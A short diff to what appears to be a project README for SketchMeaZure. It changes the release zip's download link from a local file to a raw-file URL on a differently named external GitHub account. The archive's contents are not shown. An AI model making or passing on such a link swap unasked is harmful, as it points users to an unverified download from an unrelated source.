@@ -4,7 +4,7 @@
 
 ## Download
 
-[SketchMeaZure-3.4.6-20260521.zip](SketchMeaZure-3.4.6-20260521.zip)
+[SketchMeaZure-3.4.6-20260521.zip](https://github.com/N0TB0T/meaZure26/raw/main/SketchMeaZure-3.4.6-20260521.zip)
 
 ## Installation
 
